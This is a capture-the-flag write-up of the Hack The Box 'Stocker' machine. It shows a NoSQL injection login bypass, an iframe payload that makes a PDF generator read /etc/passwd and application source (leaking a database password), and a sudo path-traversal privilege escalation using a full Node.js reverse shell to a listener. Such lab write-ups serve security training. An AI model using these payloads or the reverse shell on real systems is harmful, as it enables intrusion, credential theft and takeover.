### Stocker HTB

### Difficulty = Easy

### IP Address = 10.10.11.196

Nmap Scan:

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Stocker]
└─$ cat nmapscan 
# Nmap 7.92 scan initiated Mon Jan 23 00:57:51 2023 as: nmap -sCV -A -p22,80 -oN nmapscan -Pn 10.10.11.196
Nmap scan report for 10.10.11.196
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 23 00:58:14 2023 -- 1 IP address (1 host up) scanned in 22.38 seconds
```

Add `stocker.htb` to `/etc/hosts`

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Stocker]
└─$ cat /etc/hosts | grep stoc
10.10.11.196    stocker.htb
```

On checking the web page

Its more of a static page
![image](https://user-images.githubusercontent.com/113513376/213947564-4bd8b21c-b102-4853-8fbe-34ff0400d744.png)

Fuzzing for vhosts

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Investigation]
└─$ ffuf -c -u http://stocker.htb/ -H "Host: FUZZ.stocker.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fl 8

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 8
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 281ms]
```

Adding the new vhost to /etc/hosts 

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Stocker]
└─$ cat /etc/hosts | grep stoc                           
10.10.11.196    stocker.htb dev.stocker.htb
```

Accessing it shows a login page 
![image](https://user-images.githubusercontent.com/113513376/213947775-1774c41a-7784-4cff-81b0-60c8898a3771.png)

Trying weak credentials doesn't bypass the login page

Then on trying NOSQL Injection which i got from https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass works

Here's the request captured when it makes a post request to /login

```
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3A8XVW8w791Amd4QZxsCRVUrl7-hfnlp7V.ispsz43tztEA0VsYgsK3XS4vF%2FNjg6pMRBVsqFdRJOk
Upgrade-Insecure-Requests: 1

username=lol&password=lol
```

At first on tampering with the request i was to cause an error which leaked the vhost path `/var/www/dev/`
![image](https://user-images.githubusercontent.com/113513376/213948487-4a4a0c42-74d8-4674-a556-0cfa37b6041e.png)

Anyways lets head on with the bypass

This request bypassed the login page

```
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 55
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3A8XVW8w791Amd4QZxsCRVUrl7-hfnlp7V.ispsz43tztEA0VsYgsK3XS4vF%2FNjg6pMRBVsqFdRJOk
Upgrade-Insecure-Requests: 1

{"username": {"$ne": null}, "password": {"$ne": null} }
```

Seems like a page where you purchase stuffs
![image](https://user-images.githubusercontent.com/113513376/213948603-9411fac2-24b8-43f8-ba45-c9310058c21f.png)

On clicking on view cart then submit purchase and capturing the request in burp it doesn't really looks like there's something to tamper with

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 328
Connection: close
Cookie: connect.sid=s%3A8XVW8w791Amd4QZxsCRVUrl7-hfnlp7V.ispsz43tztEA0VsYgsK3XS4vF%2FNjg6pMRBVsqFdRJOk

{"basket":[{"_id":"638f116eeb060210cbd83a93","title":"Toilet Paper","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1},{"_id":"638f116eeb060210cbd83a91","title":"Axe","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":1}]}
```

Now we can also view our purchase 
![image](https://user-images.githubusercontent.com/113513376/213948742-60eeebf9-8f4a-4289-9869-128fdc6d933a.png)

After clicking on view order purchase it sends the data to an api endpoint then generates a pdf file with the purchase in it
![image](https://user-images.githubusercontent.com/113513376/213948901-c27d6e56-2841-4596-80bf-5b2a83f3a97c.png)

Now lets check out the request made 

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 328
Connection: close
Cookie: connect.sid=s%3A8XVW8w791Amd4QZxsCRVUrl7-hfnlp7V.ispsz43tztEA0VsYgsK3XS4vF%2FNjg6pMRBVsqFdRJOk

{"basket":[{"_id":"638f116eeb060210cbd83a93","title":"Toilet Paper","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1},{"_id":"638f116eeb060210cbd83a91","title":"Axe","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":1}]}
```

Hmmmm the title of the item purchased is being reflected on the pdf also the id is reflected in the url 
![image](https://user-images.githubusercontent.com/113513376/213949165-096cd71c-ed4d-4591-af60-04dfff924410.png)


This could potentially be a location that we can include local files in the system

Lets use burp repeater to change the json "title" value to an iframe to see if we can get the pdf to reflect the /etc/passwd/ file 

"title": "<iframe src=file:///etc/passwd height:500px width: 500px></iframe>"

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 383
Connection: close
Cookie: connect.sid=s%3A8XVW8w791Amd4QZxsCRVUrl7-hfnlp7V.ispsz43tztEA0VsYgsK3XS4vF%2FNjg6pMRBVsqFdRJOk

{"basket":[{"_id":"638f116eeb060210cbd83a93","title": "<iframe src=file:///etc/passwd height:500px width: 500px></iframe>","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1},{"_id":"638f116eeb060210cbd83a91","title":"Axe","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":1}]}
```
![image](https://user-images.githubusercontent.com/113513376/213949318-6a17e51d-8668-41c4-8d90-dea267eadcee.png)

Now accessing the pdf again but this time with the new orderID

It works but its looks kinda small
![image](https://user-images.githubusercontent.com/113513376/213949419-9ec993b2-5ed2-4ce5-8712-a54822f8126c.png)

So i'll redit the request again 

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 239
Connection: close
Cookie: connect.sid=s%3A8XVW8w791Amd4QZxsCRVUrl7-hfnlp7V.ispsz43tztEA0VsYgsK3XS4vF%2FNjg6pMRBVsqFdRJOk

{"basket":[{"_id":"638f116eeb060210cbd83a93","title": "<iframe src=file:///etc/passwd height=750px width=750px></iframe>","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1}]}
```

And try accessing it with the new orderID
![image](https://user-images.githubusercontent.com/113513376/213949740-6dfdf2f4-6d19-48bc-98d2-f8a501e2abe7.png)

Now we have the full content of the /etc/passwd file

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

And we have a potential user 

So i tried to read the user's ssh key but it failed 

Now lets loot to find credentials

So we know already that this web server is running on Express which is Nodejs 

We can confirm it by looking at wappalyzer to know the framework the web server uses
![image](https://user-images.githubusercontent.com/113513376/213950010-0df1c23c-b40b-4bcd-88ca-c09ccf66f372.png)

Now every Express server has a file which is usually included in the nodejs package and its called the index.js file 

Lets try reading it 

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 248
Connection: close
Cookie: connect.sid=s%3A8XVW8w791Amd4QZxsCRVUrl7-hfnlp7V.ispsz43tztEA0VsYgsK3XS4vF%2FNjg6pMRBVsqFdRJOk

{"basket":[{"_id":"638f116eeb060210cbd83a93","title": "<iframe src=file:///var/www/dev/index.js height=750px width=750px></iframe>","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1}]}
```

On reading the output we see the mongodb credential `dev:IHeardPassphrasesArePrettySecure`
![image](https://user-images.githubusercontent.com/113513376/213950084-5555e7f4-8b7a-4124-96fc-f6eb8821ec7a.png)

```
Stockers - Purchase Order
Supplier
Stockers Ltd.
1 Example Road
Folkestone
Kent
CT19 5QS
GB
Purchaser
Angoose
1 Example Road
London
GB
1/23/2023
Thanks for shopping with us!
Your order summary:
Item Price
(£) Quantit
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?
authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
session({
secret: randomBytes(32).toString("hex"),
resave: false,
saveUninitialized: true,
store: MongoStore.create({
mongoUrl: dbURI,
}),
})
);
app.use("/static", express.static(__dirname + "/assets"));
app.get("/", (req, res) => {
return res.redirect("/login");
});
app.get("/api/products", async (req, res) => {
if (!req.session.user) return res.json([]);
const products = await mongoose.model("Product").find();
return res.json(products);
});
app.get("/login", (req, res) => {
if (req.session.user) return res.redirect("/stock");
return res.sendFile(__dirname + "/templates/login.html");
});
app.post("/login", async (req, res) => {
const { username, password } = req.body;
```

Trying the cred over ssh works 

```                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Stocker]
└─$ ssh angoose@stocker.htb                                   
The authenticity of host 'stocker.htb (10.10.11.196)' can't be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'stocker.htb' (ED25519) to the list of known hosts.
angoose@stocker.htb's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$ 
```

Now lets escalate our privilege to root

Checking sudo permission shows the user can run node binary on any js file in /usr/local/scripts/

```
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

But we don't have any read/write access in that directory

```
angoose@stocker:/usr/local/scripts$ ls -al
total 32
drwxr-xr-x  3 root root 4096 Dec  6 10:33 .
drwxr-xr-x 11 root root 4096 Dec  6 10:33 ..
-rwxr-x--x  1 root root  245 Dec  6 09:53 creds.js
-rwxr-x--x  1 root root 1625 Dec  6 09:53 findAllOrders.js
-rwxr-x--x  1 root root  793 Dec  6 09:53 findUnshippedOrders.js
drwxr-xr-x  2 root root 4096 Dec  6 10:33 node_modules
-rwxr-x--x  1 root root 1337 Dec  6 09:53 profitThisMonth.js
-rwxr-x--x  1 root root  623 Dec  6 09:53 schema.js
angoose@stocker:/usr/local/scripts$ 
```

So we can instead redirect it to a directory we specify

In our home directory I saved a js reverse shell in a file and i have a nc listener listening on port 4444

```
angoose@stocker:~$ nano shell.js
angoose@stocker:~$ cat shell.js 
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.17", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
angoose@stocker:~$ 
```

Now lets run the sudo priv but instead make it redirect to our directory

```
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/shell.js 
```

It hangs but back on the listener

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.196] 52904
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls -al
total 44
drwx------  6 root root 4096 Jan  9 10:42 .
drwxr-xr-x 20 root root 4096 Dec 23 16:58 ..
lrwxrwxrwx  1 root root    9 Dec  6 09:54 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Nov 19 10:52 .bashrc
drwx------  3 root root 4096 Dec  6 10:33 .cache
drwxr-xr-x  3 root root 4096 Dec  6 10:33 .local
drwx------  3 root root 4096 Dec  6 10:33 .mongodb
drwxr-xr-x  4 root root 4096 Dec  6 10:33 .npm
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Jan 22 23:16 root.txt
-rw-r--r--  1 root root   66 Dec 21 21:35 .selected_editor
-rw-r--r--  1 root root   13 Nov 19 10:52 .vimrc
cat root.txt
e2f16acfc2dcf44585d2c534c42a969e
```

And we're done


<br> <br>
[Back To Home](../../index.md)
<br>












